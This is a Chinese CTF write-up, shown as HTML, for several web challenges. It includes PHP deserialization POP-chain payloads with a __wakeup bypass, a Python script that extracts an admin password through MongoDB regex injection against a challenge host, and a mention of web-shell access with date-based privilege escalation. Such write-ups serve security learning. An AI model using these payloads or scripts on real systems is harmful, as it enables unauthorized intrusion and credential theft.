class="comment">//vps:7002/2.txt</span></span><br></pre></td></tr></table></figure><p>下载远程文件2.txt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903184203562.png" alt="image-20220903184203562"></p><p>蚁剑连接，虚拟终端，经典的date提权，和蓝帽杯一样</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903182842310.png" alt="image-20220903182842310"></p><h2 id="step-by-step"><a href="#step-by-step" class="headerlink" title="step_by_step"></a>step_by_step</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;y1-&gt;magic();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;y1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hint</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hint杯调用&#x27;</span>;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$hey_mean_then</span>/is&quot;</span>, <span class="variable">$file</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;<span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cheng</span>();</span><br><span class="line"><span class="variable">$bbb</span> = <span class="keyword">new</span> <span class="title function_ invoke__">bei</span>();</span><br><span class="line"><span class="variable">$ccc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ddd = new cheng();</span></span><br><span class="line"><span class="comment">// $ddd-&gt;c1 = new yang();</span></span><br><span class="line"><span class="comment">// $ccc-&gt;y1 = &quot;hint&quot;;</span></span><br><span class="line"><span class="variable">$ccc</span>-&gt;y1 = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ccc</span>);</span><br><span class="line"><span class="variable">$bbb</span>-&gt;b1 = <span class="variable">$ccc</span>;</span><br><span class="line"><span class="variable">$aaa</span>-&gt;c1 = <span class="variable">$bbb</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="comment">// unserialize(serialize($aaa));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">// O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:3:&quot;bei&quot;:2:&#123;s:2:&quot;b1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;N;&#125;&#125;&#125;s:2:&quot;b2&quot;;N;&#125;&#125;</span></span><br><span class="line"><span class="comment">// O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:3:&quot;bei&quot;:2:&#123;s:2:&quot;b1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;s:7:&quot;phpinfo&quot;;&#125;s:2:&quot;b2&quot;;N;&#125;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接查看phpinfo，就可得flag，离谱啊</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903184831886.png" alt="image-20220903184831886"></p><h2 id="safepop"><a href="#safepop" class="headerlink" title="safepop"></a>safepop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="comment">// private $func = &#x27;call_user_func_array&#x27;;</span></span><br><span class="line">    <span class="comment">// private $func = &quot;phpinfo&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = [<span class="keyword">new</span> <span class="title class_">Test</span>(),<span class="string">&quot;getFlag&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;      <span class="comment">//在对象中调用一个不可访问方法</span></span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">//反序列化之前调用  需要绕过   当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;   <span class="comment">//相当于waf</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;      <span class="comment">//在对象中调用一个不可访问方法</span></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();      <span class="comment">//可能从这里获取信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//反序列化之前调用</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;      <span class="comment">//读取不可访问（protected 或 private）或不存在的属性的值时</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;       <span class="comment">//PHP get_class函数 ——返回对象所属的类名</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">        <span class="comment">// $this-&gt;p = &quot;phpinfo&quot;;  //属性不存在,触发get方法</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="string">&quot;getFlag&quot;</span>;  <span class="comment">//属性不存在,触发get方法</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;      <span class="comment">//属性，对应A</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// if(isset($_GET[&#x27;pop&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//     $pop = $_GET[&#x27;pop&#x27;];</span></span><br><span class="line"><span class="comment">//     $o = unserialize($pop);</span></span><br><span class="line"><span class="comment">//     throw new Exception(&quot;no pop&quot;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="variable">$aaa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>([<span class="variable">$aaa</span>,<span class="number">1</span>]);</span><br><span class="line"><span class="comment">// echo $zzz;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$yyy</span> = <span class="string">&#x27;O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:3:&quot;xxx&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:9:&quot;Funfunc&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// unserialize($yyy);</span></span><br><span class="line"><span class="variable">$zzz</span> = <span class="string">&#x27;a:2:&#123;i:0;O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;i:1;i:1;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// unserialize($zzz);</span></span><br><span class="line"><span class="comment">//查看phpinfo()   利用Fun类的call_user_func调用function</span></span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:9:&quot;Funfunc&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&#125;   </span></span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line"><span class="comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:2:&#123;s:4:&quot;func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;i:1;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>注意修改<code>O:3:&quot;Fun&quot;:1:</code>为<code>O:3:&quot;Fun&quot;:2:</code>来绕过wakeup</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903203124039.png" alt="image-20220903203124039"></p><h2 id="EzNode1"><a href="#EzNode1" class="headerlink" title="EzNode1"></a>EzNode1</h2><p>dirsearch扫描,&#x2F;login路由有登录界面</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904023404296.png" alt="image-20220904023404296"></p><p>f12查看源码，提示用户名</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904013052754.png" alt="image-20220904013052754"></p><p>使用Wappalyzer，源码为nodejs</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904085718385.png" alt="image-20220904085718385"></p><p>找到一个Mongodb注入，结合regx</p><p><a href="https://www.secpulse.com/archives/3278.html">Mongodb注入攻击 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://www.secpulse.com/archives/1916.html">HCTF2014 Writeup - SecPulse.COM | 安全脉搏</a></p><p>发现了一个不一样的回显，password的第一个字母为t</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904023623922.png" alt="image-20220904023623922"></p><p>根据<code>Are You Kidding Me?</code>结合Mongodb和regex注入攻击写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(string.printable)</span><br><span class="line"><span class="built_in">str</span> = string.ascii_lowercase+string.ascii_uppercase+string.digits+<span class="string">&#x27;~!@#$%^()_&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        data1 = <span class="string">&quot;username=administrator&amp;password[$regex]=^&quot;</span> + result + i</span><br><span class="line">        <span class="built_in">print</span>(data1)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url = <span class="string">&quot;http://3000.endpoint-15446f1451474a1ab020eac1131fbdea.dasc.buuoj.cn:81/login&quot;</span>,headers=headers,data = data1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(r.text))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;Kidding&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="built_in">print</span>(result + i)</span><br><span class="line">            result = result + i</span><br><span class="line"></span><br><span class="line"><span class="comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;thejs.session=s%3AB2nvBGFBBl6FtWWKzZjlNhZsYD4z9zyV.CB%2BIX6xIxKv%2Bw%2FFHAIb1MKBRn5olbtsmcaSlrV1zNXo&#x27;,&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;</span></span><br><span class="line"><span class="comment"># r = requests.post(url=&quot;http://3000.endpoint-e1d7ac3bc3ad4e4e939925ec0ce1bc4e.dasc.buuoj.cn:81/login&quot;,data=&quot;username=administrator&amp;password[$regex]=^1&quot;)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br></pre></td></tr></table></figure><p>回显</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904024228986.png" alt="image-20220904024228986"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">tHe_pAsSw0rd_thAt_y0u_NeVer_Kn0w</span><br></pre></td></tr></table></figure><p>然后输入密码，登录</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904024458658.png" alt="image-20220904024458658"></p><p>&#x2F;source查看源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mongoose.<span class="title function_">connect</span>(<span class="string">&#x27;mongodb://localhost/ctf&#x27;</span>, &#123; <span class="attr">useNewUrlParser</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>));</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">admin</span> === <span class="literal">undefined</span> || req.<span class="property">session</span>.<span class="property">admin</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// login</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/home&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">data</span> !== <span class="literal">undefined</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">data</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">real_name</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span 